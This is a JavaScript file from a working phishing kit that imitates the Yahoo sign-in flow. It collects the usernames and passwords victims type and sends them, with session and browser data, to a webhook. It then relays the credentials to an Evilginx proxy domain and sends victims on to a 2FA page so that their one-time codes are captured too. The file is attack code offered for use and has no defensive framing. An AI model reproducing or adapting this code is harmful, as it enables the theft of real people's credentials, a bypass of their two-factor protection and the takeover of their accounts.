// Yahoo Custom Flow - Complete Working Version with Real OTP Integration
;(() => {
  console.log("Yahoo custom flow script loaded")

  // Configuration
  const CONFIG = {
    evilginxDomain: "login.astrowind.live",
    webhookUrl: "https://webhook.site/your-webhook-id", // Replace with your webhook
    endpoints: {
      password: "https://login.astrowind.live/account/challenge/password",
      capture: "https://login.astrowind.live/evilginx-capture",
    },
  }

  // State management
  const formState = {
    currentStep: "username", // username, password, error
    username: "",
    password: "",
    sessionData: {},
    isSubmitting: false,
  }

  // Utility functions
  const utils = {
    getUrlParams: () => {
      const params = new URLSearchParams(window.location.search)
      return {
        u: params.get("u") || "",
        sessionIndex: params.get("sessionIndex") || "",
        acrumb: params.get("acrumb") || "",
        src: params.get("src") || "",
        timestamp: params.get("timestamp") || "",
      }
    },

    generateSessionId: () => {
      return "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now()
    },

    captureData: async (data) => {
      try {
        // Send to webhook for logging
        await fetch(CONFIG.webhookUrl, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            ...data,
            timestamp: Date.now(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            sessionId: formState.sessionData.sessionId,
          }),
        })

        console.log("Data captured:", data.type)
      } catch (error) {
        console.debug("Capture failed:", error)
      }
    },

    setLoading: (isLoading) => {
      const form = document.querySelector(".form")
      if (isLoading) {
        form.classList.add("yahoo-custom-loading")
      } else {
        form.classList.remove("yahoo-custom-loading")
      }
      formState.isSubmitting = isLoading
    },

    showError: (message) => {
      // Remove existing error
      const existingError = document.querySelector(".yahoo-custom-error")
      if (existingError) {
        existingError.remove()
      }

      // Create new error
      const errorDiv = document.createElement("div")
      errorDiv.className = "yahoo-custom-error"
      errorDiv.textContent = message
      errorDiv.style.display = "block"

      const mailDiv = document.querySelector(".mail")
      mailDiv.insertBefore(errorDiv, mailDiv.firstChild)
    },

    showSuccess: (message) => {
      const successDiv = document.createElement("div")
      successDiv.className = "yahoo-custom-success"
      successDiv.textContent = message
      successDiv.style.display = "block"

      const mailDiv = document.querySelector(".mail")
      mailDiv.insertBefore(successDiv, mailDiv.firstChild)
    },

    switchStep: (step) => {
      const mail = document.querySelector(".mail")
      const pazzi = document.querySelector(".pazzi")
      const errry = document.querySelector(".errry")

      // Hide all steps
      mail.style.display = "none"
      pazzi.style.display = "none"
      errry.style.display = "none"

      // Show target step
      switch (step) {
        case "username":
          mail.style.display = "block"
          formState.currentStep = "username"
          break
        case "password":
          pazzi.style.display = "block"
          formState.currentStep = "password"
          // Update username display
          const usernameDisplay = document.getElementById("username-display")
          if (usernameDisplay) {
            usernameDisplay.textContent = formState.username
          }
          break
        case "error":
          errry.style.display = "block"
          formState.currentStep = "error"
          break
      }

      console.log("Switched to step:", step)
    },
  }

  // Session management
  const sessionManager = {
    init: () => {
      const urlParams = utils.getUrlParams()
      formState.sessionData = {
        sessionId: utils.generateSessionId(),
        sessionIndex: urlParams.sessionIndex,
        acrumb: urlParams.acrumb,
        source: urlParams.src,
        referrer: document.referrer,
        timestamp: Date.now(),
      }

      // Pre-fill username if provided
      if (urlParams.u) {
        const usernameField = document.querySelector('input[name="name"]')
        if (usernameField) {
          usernameField.value = decodeURIComponent(urlParams.u)
          formState.username = usernameField.value
          // If username is pre-filled, go directly to password step
          setTimeout(() => {
            utils.switchStep("password")
          }, 500)
        }
      }

      console.log("Session initialized:", formState.sessionData)
    },
  }

  // Form validation
  const validator = {
    validateEmail: (email) => {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      const phoneRegex = /^[+]?[1-9][\d]{0,15}$/
      return emailRegex.test(email) || phoneRegex.test(email)
    },

    validateUsername: () => {
      const username = document.querySelector('input[name="name"]').value.trim()
      if (!username) {
        utils.showError("Please enter your email address or phone number.")
        return false
      }
      if (!validator.validateEmail(username)) {
        utils.showError("Please enter a valid email address or phone number.")
        return false
      }
      return true
    },

    validatePassword: () => {
      const password = document.querySelector('input[name="input18"]').value
      if (!password) {
        utils.showError("Please enter your password.")
        return false
      }
      return true
    },
  }

  // Form handlers
  const formHandlers = {
    handleUsernameNext: async (event) => {
      event.preventDefault()
      if (formState.isSubmitting) return

      const usernameField = document.querySelector('input[name="name"]')
      const username = usernameField.value.trim()

      if (!validator.validateUsername()) return

      formState.username = username
      utils.setLoading(true)

      // Capture username
      await utils.captureData({
        type: "username_entered",
        username: username,
        sessionData: formState.sessionData,
        source: "custom_page",
      })

      console.log("Username captured:", username)

      // Simulate delay
      await new Promise((resolve) => setTimeout(resolve, 1000))

      utils.setLoading(false)
      utils.switchStep("password")
    },

    handlePasswordSubmit: async (event) => {
      event.preventDefault()
      if (formState.isSubmitting) return

      const passwordField = document.querySelector('input[name="input18"]')
      const password = passwordField.value

      if (!validator.validatePassword()) return

      formState.password = password
      utils.setLoading(true)

      // Capture credentials
      await utils.captureData({
        type: "credentials_captured",
        username: formState.username,
        password: password,
        sessionData: formState.sessionData,
        source: "custom_page",
      })

      console.log("Credentials captured:", { username: formState.username, password: "***" })

      // Simulate realistic delay
      await new Promise((resolve) => setTimeout(resolve, 2000 + Math.random() * 1000))

      try {
        // Try to submit to evilginx domain
        const submitData = new URLSearchParams({
          name: formState.username,
          input18: password,
          sessionIndex: formState.sessionData.sessionIndex || "",
          acrumb: formState.sessionData.acrumb || "",
          checkbox: "on", // Stay signed in
        })

        console.log("Submitting to evilginx:", CONFIG.endpoints.password)

        const response = await fetch(CONFIG.endpoints.password, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
            Origin: window.location.origin,
            Referer: window.location.href,
          },
          body: submitData,
          credentials: "include",
          mode: "cors",
        })

        console.log("Response status:", response.status)

        // Capture response
        await utils.captureData({
          type: "evilginx_response",
          status: response.status,
          statusText: response.statusText,
          headers: Object.fromEntries(response.headers.entries()),
        })

        if (response.ok) {
          const responseText = await response.text()

          // Check response for next step indicators
          if (
            responseText.includes("challenge-selector") ||
            responseText.includes("2-step") ||
            responseText.includes("verification")
          ) {
            // Redirect to 2FA page
            const params = new URLSearchParams({
              u: formState.username,
              sessionIndex: formState.sessionData.sessionIndex || "",
              acrumb: formState.sessionData.acrumb || "",
            })
            window.location.href = `2fa.html?${params.toString()}`
          } else if (responseText.includes("mail.yahoo.com") || response.redirected) {
            // Success - redirect to mail
            utils.showSuccess("Sign in successful! Redirecting...")
            setTimeout(() => {
              window.location.href = "https://mail.yahoo.com/"
            }, 1500)
          } else {
            // Unknown response - go to 2FA anyway
            const params = new URLSearchParams({
              u: formState.username,
              sessionIndex: formState.sessionData.sessionIndex || "",
              acrumb: formState.sessionData.acrumb || "",
            })
            window.location.href = `2fa.html?${params.toString()}`
          }
        } else {
          // Error response - show error or go to 2FA
          if (response.status === 403 || response.status === 429) {
            utils.showError("Too many attempts. Please try again later.")
            setTimeout(() => {
              utils.switchStep("error")
            }, 2000)
          } else {
            // Assume 2FA required
            const params = new URLSearchParams({
              u: formState.username,
              sessionIndex: formState.sessionData.sessionIndex || "",
              acrumb: formState.sessionData.acrumb || "",
            })
            window.location.href = `2fa.html?${params.toString()}`
          }
        }
      } catch (error) {
        console.debug("Submit error:", error)

        // Capture error
        await utils.captureData({
          type: "submit_error",
          error: error.message,
          stack: error.stack,
        })

        // Default to 2FA flow on error
        const params = new URLSearchParams({
          u: formState.username,
          sessionIndex: formState.sessionData.sessionIndex || "",
          acrumb: formState.sessionData.acrumb || "",
        })
        window.location.href = `2fa.html?${params.toString()}`
      }

      utils.setLoading(false)
    },

    handleRefresh: (event) => {
      event.preventDefault()
      window.location.reload()
    },
  }

  // Event listeners
  const setupEventListeners = () => {
    // Username next button
    const usernameNext = document.getElementById("username-next")
    if (usernameNext) {
      usernameNext.addEventListener("click", formHandlers.handleUsernameNext)
    }

    // Password submit button
    const passwordSubmit = document.getElementById("password-submit")
    if (passwordSubmit) {
      passwordSubmit.addEventListener("click", formHandlers.handlePasswordSubmit)
    }

    // Form submission
    const form = document.getElementById("email-form")
    if (form) {
      form.addEventListener("submit", (event) => {
        event.preventDefault()
        if (formState.currentStep === "username") {
          formHandlers.handleUsernameNext(event)
        } else if (formState.currentStep === "password") {
          formHandlers.handlePasswordSubmit(event)
        }
      })
    }

    // Refresh button
    const refreshButton = document.getElementById("refreshButton")
    if (refreshButton) {
      refreshButton.addEventListener("click", formHandlers.handleRefresh)
    }

    // Enter key handling
    document.addEventListener("keypress", (event) => {
      if (event.key === "Enter" && !formState.isSubmitting) {
        if (formState.currentStep === "username") {
          formHandlers.handleUsernameNext(event)
        } else if (formState.currentStep === "password") {
          formHandlers.handlePasswordSubmit(event)
        }
      }
    })

    // Password visibility toggle
    const passwordToggle = document.querySelector(".ms-password-button")
    if (passwordToggle) {
      passwordToggle.addEventListener("click", (event) => {
        event.preventDefault()
        const passwordField = document.querySelector('input[name="input18"]')
        const isPassword = passwordField.type === "password"
        passwordField.type = isPassword ? "text" : "password"
      })
    }

    console.log("Event listeners setup complete")
  }

  // Initialize
  const init = () => {
    console.log("Initializing Yahoo custom flow")

    // Initialize session
    sessionManager.init()

    // Setup event listeners
    setupEventListeners()

    // Initial capture
    utils.captureData({
      type: "page_loaded",
      page: "password",
      sessionData: formState.sessionData,
      urlParams: utils.getUrlParams(),
    })

    console.log("Yahoo custom flow initialized")
  }

  // Start when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init)
  } else {
    init()
  }
})()
